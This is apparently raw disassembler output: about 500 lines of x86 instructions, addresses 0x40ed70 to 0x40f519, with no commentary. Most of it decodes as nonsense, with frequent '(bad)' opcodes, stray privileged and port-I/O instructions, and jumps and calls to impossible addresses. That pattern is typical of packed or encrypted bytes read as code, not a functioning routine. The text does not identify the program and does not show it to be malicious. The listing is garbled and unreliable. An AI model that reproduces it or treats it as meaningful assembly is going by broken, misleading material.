  40ed70:	adc    DWORD PTR [ecx-0x1],0x45
  40ed74:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ed7a:	lea    edi,[eax-0x7fff4ca]
  40ed80:	mov    eax,0x4550402
  40ed85:	cmp    ebp,ecx
  40ed87:	jne    0x40ed34
  40ed89:	mov    eax,DWORD PTR ds:0x241e808
  40ed8f:	loope  0x40ed91
  40ed91:	inc    eax
  40ed92:	stc    
  40ed93:	xlat   BYTE PTR ds:[ebx]
  40ed94:	ss inc ecx
  40ed96:	aas    
  40ed97:	in     eax,0x7d
  40ed99:	ret    0x8b
  40ed9c:	lock mov edi,DWORD PTR [ebp-0x18]
  40eda0:	and    edi,edi
  40eda2:	mov    edi,edi
  40eda4:	call   0xe40eee80
  40eda9:	push   es
  40edaa:	add    al,ch
  40edac:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40edb3:	(bad)  
  40edb4:	hlt    
  40edb5:	add    eax,0xffd3e87d
  40edba:	cmp    bh,0x8
  40edbd:	(bad)  
  40edbe:	fld    DWORD PTR [esi]
  40edc0:	out    dx,al
  40edc1:	call   0xff9fecc9
  40edc6:	cmp    al,0x46
  40edc8:	shr    esp,0x8
  40edcb:	(bad)  
  40edcc:	pop    es
  40edcd:	fisttp QWORD PTR [ebp+0xe577eff]
  40edd3:	push   ebx
  40edd4:	add    BYTE PTR [ebx+0x24008b56],cl
  40edda:	add    BYTE PTR [ebp+0x50],al
  40eddd:	push   eax
  40edde:	add    DWORD PTR [ebx+0x757d1834],ecx
  40ede4:	sub    edx,DWORD PTR [esi-0x24]
  40ede7:	jne    0x40ed9f
  40ede9:	lods   eax,DWORD PTR ds:[esi]
  40edea:	mov    edx,DWORD PTR [edx-0x34]
  40eded:	dec    esi
  40edee:	out    0x83,eax
  40edf0:	into   
  40edf1:	push   edi
  40edf3:	loopne 0x40edc3
  40edf5:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40edf9:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ee00:	rol    DWORD PTR [edx],0x8
  40ee03:	mov    esp,ecx
  40ee05:	cmp    DWORD PTR [ebx],0xc
  40ee08:	mov    esi,0x5001c0
  40ee0d:	push   eax
  40ee0e:	push   cs
  40ee0f:	push   eax
  40ee10:	(bad)  
  40ee11:	sub    edx,edi
  40ee13:	push   esi
  40ee14:	adc    al,0xcb
  40ee16:	ins    DWORD PTR es:[edi],dx
  40ee17:	mov    eax,0x203e8
  40ee1c:	add    al,ah
  40ee1e:	inc    esi
  40ee1f:	mov    al,ch
  40ee21:	pop    es
  40ee22:	add    DWORD PTR [eax],0x1
  40ee25:	add    dh,al
  40ee27:	add    ah,ch
  40ee29:	rol    DWORD PTR [edx-0xd],1
  40ee2c:	cli    
  40ee2d:	push   0x4a
  40ee2f:	pop    ecx
  40ee30:	retf   0xfe6
  40ee33:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ee39:	(bad)  
  40ee3a:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ee40:	(bad)  
  40ee41:	sub    ebp,DWORD PTR [ebx]
  40ee43:	and    al,0x52
  40ee45:	(bad)  
  40ee46:	dec    edi
  40ee47:	inc    ebp
  40ee48:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ee4f:	add    BYTE PTR [ebp-0x7b],dh
  40ee52:	pop    eax
  40ee53:	add    BYTE PTR [edx+0x0],bl
  40ee56:	pop    edx
  40ee57:	dec    ebp
  40ee58:	jmp    DWORD PTR [ebx]
  40ee5a:	and    al,0xec
  40ee5c:	push   edx
  40ee5d:	out    0x64,eax
  40ee5f:	jmp    0xd3f2e464
  40ee64:	jmp    0x40eebe
  40ee66:	mov    al,0xfe
  40ee68:	dec    BYTE PTR [ebp-0x18fd8018]
  40ee6e:	add    BYTE PTR [esi+ebp*1],bh
  40ee71:	pop    edx
  40ee72:	icebp  
  40ee73:	mov    eax,cs
  40ee75:	ins    BYTE PTR es:[edi],dx
  40ee76:	adc    eax,0x75510000
  40ee7b:	mov    esi,0x70158
  40ee80:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ee86:	mov    edi,esp
  40ee88:	cld    
  40ee89:	jge    0x40ef00
  40ee8b:	(bad)  
  40ee8d:	aas    
  40ee8e:	and    al,0x6d
  40ee90:	adc    cl,0x1
  40ee93:	mov    eax,DWORD PTR [eax]
  40ee95:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ee9b:	dec    ebp
  40ee9c:	add    eax,ebp
  40ee9e:	add    BYTE PTR [edx],al
  40eea0:	fadd   DWORD PTR [eax]
  40eea2:	stc    
  40eea3:	enter  0xee00,0x8b
  40eea7:	sbb    eax,0x1
  40eeaa:	sbb    esi,ecx
  40eeac:	in     al,0x0
  40eeae:	in     eax,dx
  40eeaf:	add    BYTE PTR [eax],al
  40eeb1:	jne    0x40ee3e
  40eeb3:	cmp    edx,esp
  40eeb5:	jb     0x40eec0
  40eeb7:	jmp    0x40ef2e
  40eeb9:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eebf:	add    BYTE PTR [ebx+0x4d83d840],cl
  40eec5:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40eecb:	jb     0x40ee56
  40eecd:	pop    edx
  40eece:	fadd   QWORD PTR [ebx-0x7445faa1]
  40eed4:	or     dh,BYTE PTR [edx+0x0]
  40eed7:	inc    edx
  40eed8:	or     dl,bh
  40eeda:	xlat   BYTE PTR ds:[ebx]
  40eedb:	dec    edx
  40eedc:	push   edi
  40eedd:	add    al,0x7
  40eedf:	leave  
  40eee0:	rol    DWORD PTR [edx+eax*1],0x7
  40eee4:	add    ecx,ecx
  40eee6:	mov    edx,ecx
  40eee8:	int3   
  40eee9:	jmp    0x40eea9
  40eeeb:	mov    al,0x0
  40eeed:	(bad)  
  40eeee:	jne    0x40eed8
  40eef0:	mov    eax,DWORD PTR [edx]
  40eef2:	call   0xc1556bf7
  40eef7:	pop    edi
  40eef8:	add    ebx,DWORD PTR [ecx-0x37]
  40eefb:	pop    ecx
  40eefc:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40ef03:	push   es
  40ef04:	mov    eax,DWORD PTR [eax]
  40ef06:	int3   
  40ef07:	add    ch,al
  40ef09:	jae    0x40eef3
  40ef0b:	int    0x1
  40ef0d:	enter  0x3000,0x18
  40ef11:	add    BYTE PTR [ebp+0x75],al
  40ef14:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ef1a:	push   0x2
  40ef1c:	pop    ecx
  40ef1d:	add    BYTE PTR [eax],cl
  40ef1f:	push   ebx
  40ef20:	lea    edi,[edi+eax*2]
  40ef23:	mov    al,0x1
  40ef25:	jb     0x40ef27
  40ef27:	mov    al,0x10
  40ef29:	push   eax
  40ef2a:	add    al,0x75
  40ef2c:	add    BYTE PTR [ebx],ch
  40ef2e:	add    ebx,esp
  40ef30:	int3   
  40ef31:	jne    0x40ef43
  40ef33:	movsx  edx,cl
  40ef36:	add    DWORD PTR [eax],eax
  40ef38:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ef3f:	mov    gs,edi
  40ef41:	add    BYTE PTR [eax-0x50],ch
  40ef44:	add    al,ch
  40ef46:	mov    eax,DWORD PTR [ecx]
  40ef48:	sub    eax,DWORD PTR [eax]
  40ef4a:	jb     0x40efc1
  40ef4c:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ef50:	jge    0x40ef3a
  40ef52:	add    al,0x1
  40ef54:	add    DWORD PTR [eax],0x0
  40ef57:	jne    0x40ef59
  40ef59:	je     0x40efa0
  40ef5b:	mov    eax,DWORD PTR [edi]
  40ef5d:	ror    BYTE PTR [ebp+0x4d],1
  40ef60:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ef67:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ef6d:	mov    DWORD PTR [ebx],ebp
  40ef6f:	fadd   DWORD PTR [eax+0x75]
  40ef72:	inc    eax
  40ef73:	pop    eax
  40ef74:	lea    ebx,[ecx+0x4f]
  40ef77:	push   0xb1000003
  40ef7c:	out    dx,eax
  40ef7d:	add    ebp,DWORD PTR [edx+edx*2]
  40ef80:	add    BYTE PTR [ebx+ecx*4],bh
  40ef83:	mov    ch,BYTE PTR [ebx]
  40ef85:	jb     0x40eff9
  40ef87:	add    al,0x89
  40ef89:	push   eax
  40ef8a:	call   0x84293cfc
  40ef8f:	add    DWORD PTR [eax+eax*1],eax
  40ef92:	jae    0x40efa8
  40ef94:	icebp  
  40ef95:	inc    ebp
  40ef96:	mov    eax,DWORD PTR gs:[ecx]
  40ef99:	int3   
  40ef9a:	out    dx,al
  40ef9b:	loopne 0x40efea
  40ef9d:	sub    eax,DWORD PTR [edx]
  40ef9f:	push   0xffffff83
  40efa1:	pop    esi
  40efa2:	push   cs
  40efa3:	jl     0x40efbe
  40efa5:	add    al,0xaf
  40efa7:	xor    eax,0x832b6d00
  40efac:	mov    eax,DWORD PTR [edx]
  40efae:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40efb4:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40efba:	inc    ebp
  40efbb:	shr    ebx,0x3
  40efbe:	or     DWORD PTR [eax],0x4
  40efc1:	push   0xffffffa5
  40efc3:	pop    esi
  40efc4:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40efcb:	jmp    0x40f02a
  40efcd:	mov    edi,0xff0272
  40efd2:	fdivr  QWORD PTR [ebp+0x5d]
  40efd5:	push   0x4e
  40efd7:	pop    ecx
  40efd8:	call   0x4133dd
  40efdd:	mov    DWORD PTR [ebx],eax
  40efdf:	in     al,0xc8
  40efe1:	rol    BYTE PTR [ebp-0x75],0xc1
  40efe5:	call   0xaaf1c6
  40efea:	pop    esi
  40efeb:	enter  0xceff,0x8b
  40efef:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eff3:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40effa:	je     0x40effc
  40effc:	or     DWORD PTR [ebx-0x74183b24],eax
  40f002:	jne    0x40efe8
  40f004:	jmp    0x40efff
  40f006:	push   DWORD PTR [edx-0x24]
  40f009:	push   0x4d
  40f00b:	pop    ecx
  40f00c:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40f010:	jge    0x40f018
  40f012:	mov    eax,eax
  40f014:	sub    ebp,DWORD PTR [edx+0x24]
  40f017:	pop    esi
  40f018:	inc    ebp
  40f019:	mov    esp,0x8b6077
  40f01e:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40f024:	lods   al,BYTE PTR ds:[esi]
  40f025:	add    BYTE PTR [ebx],bh
  40f027:	enter  0xce73,0x49
  40f02b:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40f033:	stc    
  40f034:	jge    0x40f0a8
  40f036:	jnp    0xdd407397
  40f03c:	call   0xc3f112
  40f041:	fadd   st(0),st
  40f043:	dec    esi
  40f044:	ins    BYTE PTR es:[edi],dx
  40f045:	stc    
  40f046:	cmp    al,0x73
  40f048:	push   ebp
  40f049:	mov    eax,0xf8028b
  40f04e:	jne    0x40f011
  40f050:	mov    esi,ecx
  40f052:	mov    esp,DWORD PTR [ebp+0x2c]
  40f055:	add    edi,DWORD PTR [ebp-0x24]
  40f058:	sub    esp,eax
  40f05a:	and    al,0x45
  40f05c:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40f062:	sbb    al,0xee
  40f064:	pop    esi
  40f065:	call   0x80f095
  40f06a:	fsubr  st,st(3)
  40f06c:	sti    
  40f06d:	add    BYTE PTR gs:[ecx],bh
  40f070:	add    eax,esp
  40f072:	add    DWORD PTR [esi],eax
  40f074:	rol    DWORD PTR [ebp+0x8],0x29
  40f078:	mov    esp,eax
  40f07a:	clc    
  40f07b:	jne    0x40f0f2
  40f07d:	mov    eax,0x8b0673
  40f082:	loopne 0x40f0c9
  40f084:	loopne 0x40f00f
  40f086:	lods   al,BYTE PTR ds:[esi]
  40f087:	int3   
  40f088:	inc    ebp
  40f089:	mov    DWORD PTR gs:[eax+edi*8],eax
  40f08d:	add    al,0xc3
  40f08f:	sub    ecx,DWORD PTR [ebp+0x47]
  40f092:	(bad)  
  40f094:	shr    BYTE PTR [ebp-0x1f],0xe8
  40f098:	add    eax,DWORD PTR [eax]
  40f09a:	call   0x642b19f
  40f09f:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40f0a5:	dec    esi
  40f0a6:	ins    DWORD PTR es:[edi],dx
  40f0a7:	in     al,dx
  40f0a8:	lea    eax,[eax]
  40f0aa:	inc    ebp
  40f0ab:	inc    ebp
  40f0ac:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40f0b2:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40f0bc:	and    al,0xdc
  40f0be:	ror    DWORD PTR [edx+0x24],0xf7
  40f0c2:	or     BYTE PTR [ebp+0x4c],dh
  40f0c5:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40f0c9:	stos   BYTE PTR es:[edi],al
  40f0ca:	adc    edx,edi
  40f0cc:	inc    esp
  40f0cd:	add    edi,DWORD PTR [eax]
  40f0cf:	jne    0x40f0b4
  40f0d1:	mov    DWORD PTR [eax-0x7449db04],ecx
  40f0d7:	cmp    ecx,DWORD PTR [edi]
  40f0d9:	sub    BYTE PTR [ebp-0x7e],dl
  40f0dc:	sar    ebp,0xb
  40f0df:	jmp    FWORD PTR [edi+0x2400392a]
  40f0e5:	sub    esi,DWORD PTR [ebx-0x73]
  40f0e8:	mov    esp,DWORD PTR [ecx+edi*4]
  40f0eb:	mov    ecx,DWORD PTR [eax]
  40f0ed:	and    BYTE PTR [eax],al
  40f0ef:	jne    0x40f0bb
  40f0f1:	sub    ebp,ecx
  40f0f3:	sbb    BYTE PTR [esi+0x32],ah
  40f0f6:	dec    ebp
  40f0f7:	push   ebp
  40f0f8:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40f0fe:	ret    
  40f0ff:	mov    edx,ebp
  40f101:	leave  
  40f102:	sub    DWORD PTR [esi+0x24],ebx
  40f105:	ret    0x2b
  40f108:	pop    ax
  40f10a:	push   ebp
  40f10b:	rol    BYTE PTR [ebx],0xeb
  40f10e:	add    DWORD PTR [ecx+0x6c0001],0x40
  40f115:	jb     0x40f16c
  40f117:	ret    
  40f118:	in     al,dx
  40f119:	jecxz  0x40f0a6
  40f11b:	push   esi
  40f11c:	xchg   esp,eax
  40f11d:	jne    0x40f11f
  40f11f:	cmp    edx,DWORD PTR [esi+0x1c]
  40f122:	jne    0x40f108
  40f124:	mov    eax,DWORD PTR [ebp-0x77]
  40f127:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f12e:	mov    esi,DWORD PTR [ebp-0x75]
  40f131:	pop    esi
  40f132:	nop
  40f133:	mov    eax,DWORD PTR [eax]
  40f135:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f13b:	add    al,0x0
  40f13d:	inc    ebp
  40f13e:	mov    eax,DWORD PTR [ebx]
  40f140:	mov    ebp,ebx
  40f142:	cmp    al,0xf
  40f144:	or     al,al
  40f146:	inc    ebp
  40f147:	inc    ebp
  40f148:	xor    eax,0x8bc89c8b
  40f14d:	ins    BYTE PTR es:[edi],dx
  40f14e:	cld    
  40f14f:	add    BYTE PTR [edi+0x566c16c0],dh
  40f155:	add    BYTE PTR [ecx-0x5],dl
  40f158:	add    eax,0x17200
  40f15d:	sbb    al,0x85
  40f15f:	dec    esp
  40f160:	je     0x40f19a
  40f162:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f166:	add    BYTE PTR [ebx],bh
  40f168:	(bad)  
  40f169:	and    al,0x32
  40f16b:	jae    0x40f109
  40f16d:	mov    cl,cl
  40f16f:	inc    DWORD PTR [esp]
  40f172:	push   ebp
  40f173:	shr    esp,0x8
  40f176:	in     al,dx
  40f177:	push   esp
  40f178:	add    DWORD PTR [eax],esp
  40f17a:	add    bl,cl
  40f17c:	inc    ebp
  40f17d:	mov    bh,0x53
  40f17f:	add    BYTE PTR [ebp-0x17],al
  40f182:	push   esi
  40f183:	cmovne ecx,edx
  40f186:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f18a:	push   edi
  40f18b:	pop    ss
  40f18c:	xor    eax,0x89009cd9
  40f191:	add    ah,bh
  40f193:	sub    eax,DWORD PTR [ebp-0x3f]
  40f196:	aad    0x5
  40f198:	inc    ebp
  40f199:	add    edx,edx
  40f19b:	add    BYTE PTR [ebp-0x40],al
  40f19e:	xlat   BYTE PTR ds:[ebx]
  40f19f:	ins    BYTE PTR es:[edi],dx
  40f1a0:	inc    ebp
  40f1a1:	inc    eax
  40f1a2:	and    ecx,eax
  40f1a4:	dec    eax
  40f1a5:	add    eax,0x20204c45
  40f1aa:	inc    ebp
  40f1ab:	fnstcw WORD PTR [esi+0x29]
  40f1ae:	leave  
  40f1af:	add    BYTE PTR [esi+0xc000c0],bh
  40f1b5:	lea    eax,[esp-0x34]
  40f1b9:	ret    
  40f1ba:	mov    dh,0x8b
  40f1bc:	xor    edx,DWORD PTR [ecx+0x3]
  40f1bf:	mov    al,BYTE PTR [ecx+0x1]
  40f1c2:	sbb    BYTE PTR [eax],al
  40f1c4:	stc    
  40f1c5:	mov    esi,DWORD PTR [edx+0x8]
  40f1c8:	(bad)  
  40f1c9:	les    esi,FWORD PTR ss:[ecx]
  40f1cc:	(bad)  
  40f1cd:	mov    al,ch
  40f1cf:	add    esi,eax
  40f1d1:	add    dh,al
  40f1d3:	or     esi,eax
  40f1d5:	mov    dl,0xc7
  40f1d7:	add    esi,eax
  40f1d9:	add    al,cl
  40f1db:	push   cs
  40f1dc:	mov    BYTE PTR [edx+0xc601c9],0xca
  40f1e3:	or     BYTE PTR [ebx],dh
  40f1e5:	dec    ecx
  40f1e6:	lea    eax,[ebx]
  40f1e8:	or     eax,0x18fc0fc7
  40f1ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ee:	(bad)  
  40f1f0:	fiadd  WORD PTR [ebp-0x78]
  40f1f3:	jae    0xed75f942
  40f1f9:	or     BYTE PTR [ebp+0x7],al
  40f1fc:	loope  0x40f19b
  40f1fe:	inc    ebp
  40f1ff:	xor    dl,dh
  40f201:	pop    esi
  40f202:	inc    ebp
  40f203:	shr    edx,0xc
  40f206:	inc    ebp
  40f207:	and    ch,0x1
  40f20a:	inc    ebp
  40f20b:	add    bh,bl
  40f20d:	add    BYTE PTR [ebp-0x7b],al
  40f210:	out    dx,al
  40f211:	clc    
  40f212:	inc    ebp
  40f213:	ret    0xd7
  40f216:	inc    ebp
  40f217:	mov    edi,DWORD PTR [esi-0x7f]
  40f21a:	leave  
  40f21b:	sub    al,0x44
  40f21d:	add    BYTE PTR [ebx+ecx*4-0x76cce34a],bh
  40f224:	add    ebx,DWORD PTR [ecx+eax*2]
  40f227:	(bad)  
  40f228:	sbb    al,ah
  40f22a:	stc    
  40f22b:	test   DWORD PTR [edx-0x8],esi
  40f22e:	lea    edi,[edi-0x7007aa4]
  40f234:	mov    DWORD PTR [ebp-0x24],edi
  40f237:	(bad)  
  40f238:	dec    ebp
  40f239:	int3   
  40f23a:	mov    eax,0x71cdfcc6
  40f23f:	mov    BYTE PTR [ecx],0xce
  40f242:	(bad)  
  40f243:	(bad)  
  40f244:	dec    edi
  40f246:	jmp    FWORD PTR [edx-0x38]
  40f249:	(bad)  
  40f24a:	or     dl,al
  40f24c:	jge    0x40f214
  40f24e:	(bad)  
  40f24f:	shl    esp,1
  40f251:	xor    eax,DWORD PTR [ebp+0x45caf85a]
  40f257:	add    BYTE PTR [ebx+0xd8c8d],cl
  40f25d:	rdpmc  
  40f25f:	sbb    BYTE PTR [edi+0x7de08da],bh
  40f265:	mov    BYTE PTR [ebp+0x39063283],bl
  40f26b:	in     eax,dx
  40f26c:	cmovne ebx,DWORD PTR [edx]
  40f26f:	jecxz  0x40f271
  40f271:	inc    ebp
  40f272:	mov    esp,ecx
  40f274:	sbb    al,0x45
  40f276:	mov    ebx,edx
  40f278:	add    DWORD PTR [ebp+0x0],eax
  40f27b:	loopne 0x40f27e
  40f27d:	inc    ebp
  40f27e:	dec    ebp
  40f27f:	and    DWORD PTR [ebx+0x208045],ecx
  40f285:	inc    ebp
  40f286:	mov    DWORD PTR [esi+0x6a],edi
  40f289:	leave  
  40f28a:	mov    DWORD PTR [esp+edx*8-0x3c],0x33e5b6d6
  40f292:	inc    ebp
  40f293:	add    ebx,edi
  40f295:	inc    ecx
  40f296:	xlat   BYTE PTR ds:[ebx]
  40f297:	sbb    BYTE PTR [ebp-0x758d2b07],cl
  40f29d:	(bad)  
  40f29e:	xor    bh,BYTE PTR [eax+eax*4+0x8bd36c6]
  40f2a5:	(bad)  
  40f2a6:	dec    esi
  40f2a7:	mov    esi,0xbf45c6f3
  40f2ac:	mov    esi,eax
  40f2ae:	fadd   st,st(0)
  40f2b0:	inc    esi
  40f2b2:	(bad)  
  40f2b3:	rcl    esp,0xc6
  40f2b6:	inc    edx
  40f2b8:	push   eax
  40f2b9:	mov    BYTE PTR [ebp-0x3d],0x33
  40f2bd:	xor    eax,DWORD PTR [ebx]
  40f2bf:	lea    edx,[eax+0xd]
  40f2c2:	inc    ebp
  40f2c3:	jae    0x8c1b58e1
  40f2c9:	ficomp WORD PTR [eax+ecx*4]
  40f2cc:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f2d3:	test   esi,edi
  40f2d5:	(bad)  
  40f2d6:	(bad)  
  40f2d7:	inc    DWORD PTR [eax]
  40f2d9:	inc    ebp
  40f2da:	add    BYTE PTR [ebx-0x10aa23d0],cl
  40f2e0:	mov    edx,DWORD PTR [ebx]
  40f2e2:	cld    
  40f2e3:	mov    edi,ecx
  40f2e5:	mov    ecx,ebx
  40f2e7:	pop    esp
  40f2e8:	sar    edi,0x1e
  40f2eb:	cmp    ebp,esp
  40f2ed:	jne    0x40f362
  40f2ef:	mov    DWORD PTR ds:0x22450be4,ecx
  40f2f5:	loopne 0x40f2e3
  40f2f7:	pushf  
  40f2f8:	jae    0x40f285
  40f2fa:	add    eax,0x3388e91c
  40f2ff:	add    esp,ebp
  40f301:	add    BYTE PTR [ebx-0x40],dh
  40f304:	jmp    0x91f35f
  40f309:	mov    ebx,0x6a7275
  40f30e:	pop    ecx
  40f30f:	add    DWORD PTR [ebp+eax*4-0x77],esi
  40f313:	add    bh,BYTE PTR [eax+0x0]
  40f316:	dec    DWORD PTR [ebp+0x66]
  40f319:	mov    ecx,DWORD PTR [ebp-0xff0084]
  40f31f:	mov    DWORD PTR [edx-0x75],ebp
  40f322:	data16 sbb al,0x8d
  40f325:	mov    edi,edi
  40f327:	add    edi,edi
  40f329:	add    BYTE PTR [edx+0x1],ch
  40f32c:	data16 or BYTE PTR [ebp-0x1e00bb],cl
  40f333:	jmp    0xee6a:0xd84dc766
  40f33a:	pop    ecx
  40f33b:	jle    0x40f2c6
  40f33d:	inc    ebp
  40f33e:	sbb    BYTE PTR [esi-0x37],0x8
  40f342:	test   edx,ecx
  40f344:	(bad)  
  40f345:	jmp    0x41017c49
  40f34a:	push   ebp
  40f34b:	jne    0x40f3b3
  40f34d:	lea    ecx,[ebp-0x2c]
  40f350:	mov    DWORD PTR [ebp-0x200158],0xfe4585d6
  40f35a:	sar    bh,0xeb
  40f35d:	mov    eax,edi
  40f35f:	loopne 0x40f311
  40f361:	(bad)  
  40f362:	rol    ebx,cl
  40f364:	jmp    0xe9c0:0xdf1c458b
  40f36b:	push   eax
  40f36c:	inc    bp
  40f36e:	inc    ebp
  40f36f:	mov    eax,ebp
  40f371:	cwde   
  40f372:	mov    DWORD PTR [eax],0xd4ffc7d4
  40f378:	add    bh,bh
  40f37a:	add    BYTE PTR [ecx],al
  40f37c:	call   0x1400b81
  40f381:	inc    DWORD PTR [ebp-0xb201f8]
  40f387:	xor    eax,DWORD PTR [ebp-0xc401fd]
  40f38d:	jne    0x40f31a
  40f38f:	mov    eax,ds:0x33c70be0
  40f394:	ret    
  40f395:	out    dx,eax
  40f396:	mov    edx,DWORD PTR ds:0xbc0a31c
  40f39c:	push   eax
  40f39d:	xor    eax,DWORD PTR [ebp-0x71]
  40f3a0:	mov    esi,DWORD PTR [edx-0x68]
  40f3a3:	mov    ds:0x33ff0b00,eax
  40f3a8:	(bad)  
  40f3a9:	mov    ecx,0x8b8d0008
  40f3ae:	call   FWORD PTR [edi+edi*8]
  40f3b1:	and    bh,bh
  40f3b3:	push   0x66
  40f3b5:	mov    bp,0xff8d
  40f3b9:	(bad)  
  40f3ba:	(bad)  
  40f3bb:	dec    DWORD PTR [edi]
  40f3bd:	mov    DWORD PTR [edx],eax
  40f3bf:	jp     0x40f3c1
  40f3c1:	(bad)  
  40f3c2:	mov    ecx,0x774f59
  40f3c7:	mov    ecx,eax
  40f3c9:	jl     0x40f354
  40f3cb:	dec    DWORD PTR [eax-0x74c73fa7]
  40f3d1:	mov    DWORD PTR [esi+0x7e],esp
  40f3d4:	push   ebp
  40f3d5:	dec    DWORD PTR [ebp-0x7676f2a7]
  40f3db:	or     BYTE PTR [ebx+eiz*2+0x4d6666c2],0x55
  40f3e3:	xor    ecx,DWORD PTR [ebp-0x7627e877]
  40f3e9:	call   DWORD PTR [eax+0x668dc233]
  40f3ef:	test   al,0x55
  40f3f1:	mov    DWORD PTR [ebp-0x76bade7c],ecx
  40f3f7:	into   
  40f3f8:	xchg   esp,eax
  40f3f9:	loop   0x40f384
  40f3fb:	(bad)  
  40f3fc:	xchg   esi,eax
  40f3fd:	lods   al,BYTE PTR ds:[esi]
  40f3fe:	ret    0x8bd3
  40f401:	in     eax,dx
  40f402:	inc    bp
  40f404:	dec    ebp
  40f405:	in     al,0xb9
  40f407:	xor    BYTE PTR [edi-0x39],cl
  40f40a:	add    BYTE PTR [ecx+esi*8+0x64e189ec],dh
  40f411:	(bad)  
  40f412:	(bad)  
  40f413:	mov    eax,0x85667e8b
  40f418:	mov    ch,0xfe
  40f41a:	(bad)  
  40f41b:	(bad)  
  40f41c:	inc    DWORD PTR [eax]
  40f41e:	jno    0x40f420
  40f420:	data16 mov bl,0xb5
  40f423:	add    bh,bh
  40f425:	mov    edi,edi
  40f427:	fmul   QWORD PTR [ecx-0x729501]
  40f42d:	aam    0x8d
  40f42f:	call   edi
  40f431:	push   eax
  40f432:	mov    DWORD PTR [ebp+0x6c],eax
  40f435:	xor    edi,edi
  40f437:	add    eax,DWORD PTR [ebx-0x76bafcb0]
  40f43d:	sub    DWORD PTR [esi+0x44],0xffffffff
  40f441:	mov    ecx,DWORD PTR [ebp-0x767f1ee4]
  40f447:	add    DWORD PTR [eax+0x0],esi
  40f44a:	push   DWORD PTR [eax]
  40f44c:	push   bp
  40f44e:	lea    ecx,[ebp-0x8701]
  40f454:	mov    DWORD PTR [ecx+0x74],edx
  40f457:	sar    bh,1
  40f459:	or     DWORD PTR [ebx-0x48000386],0x77
  40f460:	fs test edi,edi
  40f463:	add    al,0x33
  40f465:	add    BYTE PTR [ebx],al
  40f467:	adc    dh,BYTE PTR [ebx]
  40f469:	add    BYTE PTR [esi-0x75],ah
  40f46c:	test   DWORD PTR [esi-0x1],esp
  40f46f:	inc    ebp
  40f470:	inc    DWORD PTR [ebx-0x2ff00abb]
  40f476:	dec    ebp
  40f477:	mov    DWORD PTR [ebx],esi
  40f479:	mov    al,BYTE PTR [ebx]
  40f47b:	push   ecx
  40f47c:	xor    esp,DWORD PTR [esi+0x66]
  40f47f:	push   ebp
  40f480:	inc    ebp
  40f481:	xor    DWORD PTR [ebx],0x8
  40f484:	mov    WORD PTR [ebp-0x72],ax
  40f488:	push   cx
  40f48a:	inc    ebp
  40f48b:	adc    WORD PTR [ebp-0x64],0xff83
  40f490:	mov    DWORD PTR [ebx],0x92b589f8
  40f496:	clc    
  40f497:	push   ecx
  40f498:	inc    ebp
  40f499:	data16 cmc 
  40f49b:	push   ebp
  40f49c:	pushf  
  40f49d:	data16 (bad) 
  40f49f:	dec    ebp
  40f4a0:	in     al,0x83
  40f4a2:	test   DWORD PTR [edi-0x76ba3508],eax
  40f4a8:	xor    ebx,DWORD PTR [eax+0xc7329c]
  40f4ae:	in     al,0x8b
  40f4b0:	add    eax,0x45b5f866
  40f4b5:	dec    DWORD PTR [ebx+0xf094ff]
  40f4bb:	mov    DWORD PTR [ecx+0x45fff466],ecx
  40f4c1:	lea    ecx,[ebx-0x4e76e3b3]
  40f4c7:	push   0x6600ff01
  40f4cc:	push   cs
  40f4cd:	test   DWORD PTR [eax+0xff01ff],eax
  40f4d3:	inc    ecx
  40f4d4:	inc    ebp
  40f4d5:	mov    WORD PTR [ebp-0x360018],ax
  40f4dc:	push   cs
  40f4dd:	shl    BYTE PTR [ebp+0x66],0x8b
  40f4e1:	test   DWORD PTR [edi+edi*8],ebx
  40f4e4:	cs (bad) 
  40f4e6:	inc    DWORD PTR [ecx-0x75]
  40f4e9:	data16 in al,dx
  40f4eb:	test   DWORD PTR [eax],ecx
  40f4ed:	inc    DWORD PTR [eax]
  40f4ef:	inc    DWORD PTR [ecx-0x77]
  40f4f2:	mov    esi,DWORD PTR [edx-0x77]
  40f4f5:	call   FWORD PTR [eax]
  40f4f7:	leavew 
  40f4f9:	xchg   ebp,eax
  40f4fa:	inc    edi
  40f4fb:	push   DWORD PTR [ebp-0x1]
  40f4fe:	call   0xff50e048
  40f503:	lea    eax,[ebp-0x1]
  40f506:	mov    edi,edi
  40f508:	enter  0xc7,0xc3
  40f50c:	mov    eax,ecx
  40f50e:	xor    ecx,DWORD PTR [ecx-0x749bfd]
  40f514:	sbb    al,0x8b
  40f516:	sbb    esp,edi
  40f518:	dec    ebp
  40f519:	mov    bh,0x8b
